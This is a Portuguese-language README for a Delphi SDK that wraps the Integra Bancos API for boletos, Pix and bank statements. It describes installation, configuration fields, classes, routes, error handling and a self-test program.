# SDK em Delphi para Integração com a API Integra Bancos

O SDK-Delphi facilita a integração do seu sistema com a API Integra Bancos (boleto, Pix e extrato). Ele cuida da autenticação OAuth2, da criptografia exigida pela API e das rotas, e devolve a resposta da API como JSON (`string`).

## Requisitos

- Delphi 10.1 Berlin ou superior
- Windows 7 SP1 ou superior, com os certificados raiz atualizados

O SDK usa apenas units da própria RTL (`System.Net.HttpClient`, `System.JSON`, `System.Hash`) e a criptografia nativa do Windows (`bcrypt.dll`). **Não é preciso instalar DLL nenhuma**: o HTTPS usa o TLS do próprio Windows, sem OpenSSL.

---

## Como instalar

1. Baixe o ZIP com as units:

   [![Baixar SDK](https://img.shields.io/badge/Baixar%20SDK-Click%20Aqui-blue)](https://github.com/integrabancos/sdk-delphi/raw/refs/heads/master/.SDK-Units/SDKUnits.zip)

2. Extraia e copie os arquivos `.pas` para o diretório do seu projeto (ou adicione a pasta ao *Search Path*).
3. Adicione ao `uses` as units que for usar: `AuthUnit`, `EmitenteUnit`, `BoletoUnit`, `PixUnit`, `ExtratoUnit`.

---

## Configuração

Todas as classes (menos `TIntegraAuth`) recebem um `TJSONObject` com a configuração:

| Campo | Obrigatório | Descrição |
|---|---|---|
| `access_token` | sempre | Token obtido com `TIntegraAuth.GetAccessToken` |
| `x_api_key` | boleto, Pix, extrato e alteração do emitente | Chave do emitente, devolvida no campo `token` ao criar o emitente |
| `secret_key` | operações criptografadas | Chave de 32 caracteres do cadastro da softhouse |
| `is_production` | não (padrão `false`) | `true` = `api.integrabancos.com.br`, `false` = `hom-api.integrabancos.com.br` |
| `timeout` | não (padrão `60`) | Segundos |
| `debug` | não (padrão `false`) | Inclui método, URL e corpo da requisição no JSON de erro |

O objeto de configuração é copiado no construtor; você pode liberá-lo (`Free`) logo depois.

## Classes e métodos

| Classe (unit) | Método | Rota |
|---|---|---|
| `TIntegraAuth` (`AuthUnit`) | `GetAccessToken(Credenciais, RefreshToken, IsProduction)` | `POST /oauth/token` |
| `TIntegraEmitente` (`EmitenteUnit`) | `Cria`, `Atualiza`, `Webhook`, `Autorizacao` | `/emitente` |
| `TIntegraBoleto` (`BoletoUnit`) | `Credenciais`, `GerarBoleto`, `ConsultarBoleto`, `AlterarBoleto`, `CancelarBoleto`, `ConsultarEventoBoleto`, `GerarImpressao`, `ConsultarImpressao` | `/cobranca` |
| `TIntegraPix` (`PixUnit`) | `Credenciais`, `Gerar`, `ConsultarPix` | `/pix` |
| `TIntegraExtrato` (`ExtratoUnit`) | `Credenciais`, `Gerar`, `ConsultarExtrato` | `/extrato` |

Os campos de cada payload são os da documentação da API, no painel do Integra Bancos. O SDK não renomeia nada: monta, criptografa quando a rota exige e envia.

## Retorno e erros

- Todo método devolve o JSON da API como `string`, inclusive quando a API recusa a operação (`"sucesso": false`).
- Falha de rede, timeout ou resposta que não é JSON também chegam como JSON: `{"sucesso": false, "mensagem": "...", "http_code": 0}`.
- Configuração ou payload incompletos (sem `x_api_key`, sem `codigo_banco` na consulta, `pagamento.valor` inválido…) levantam exceção **antes** de chamar a API, com a mensagem em JSON.

## Atenção ao valor

Envie `pagamento.valor` com **ponto** decimal (`"10.50"`), nunca vírgula. A API confere um hash calculado sobre o valor; o SDK calcula esse hash sempre com ponto, então o locale pt-BR do Windows não interfere.

---

## Exemplos

Há um exemplo por operação na pasta [`examples/`](examples/), no formato de um formulário VCL com um botão.

## Autoteste

`tests/SelfCheck.dpr` é um programa console que confere o hash e a criptografia contra valores gerados pela própria API, sem acesso à rede. Compile e rode antes de atualizar o SDK no seu sistema: ele deve terminar com "Tudo certo.".

> **Webhook:** o recebimento de webhook não faz parte do SDK Delphi, que é voltado para aplicações desktop. Cadastre a URL do seu servidor com `TIntegraEmitente.Webhook`.
